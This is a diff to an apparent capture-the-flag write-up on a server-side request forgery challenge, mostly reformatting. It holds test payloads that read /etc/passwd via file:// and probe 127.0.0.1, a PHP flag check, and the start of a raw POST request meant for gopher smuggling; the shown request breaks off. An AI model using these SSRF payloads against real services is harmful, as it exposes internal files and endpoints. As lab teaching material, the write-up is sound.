@@ -18,13 +18,12 @@ Challenge: http://h4ck3r.quest:8500/
 ## Exploit - SSRF
 When you see a preview function, then it may have SSRF problem.
 1. Test it
-`file:///etc/passwd` or `http://127.0.0.1`
-![](https://i.imgur.com/NKbIlDT.png)
+    * `file:///etc/passwd` or `http://127.0.0.1`
+    ![](https://i.imgur.com/NKbIlDT.png)
 
 2. Analyze `flag.php`
-![](https://i.imgur.com/OGo7biu.png)
-    :::spoiler source code
-    ```php=
+    ![](https://i.imgur.com/OGo7biu.png)
+    ```php
     <?php
     if ($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') die("Only for localhost user.");
     ?>
@@ -36,10 +35,9 @@ When you see a preview function, then it may have SSRF problem.
     if (isset($_POST['givemeflag']) && $_POST['givemeflag'] === 'yes')
         echo "FLAG:", getenv('FLAG');
     ```
-    :::
     If you want flag, you need visit `/flag.php` as localhost and send a form data with parameter `givemeflag`.
-3. Construct package - <font color="FF0000">**gopher**</font>
-    ```!
+3. Construct package - **<font color="FF0000">gopher</font>**
+    ```
     POST /flag.php HTTP/1.1
     Host: 127.0.0.1
     Content-Length: 14
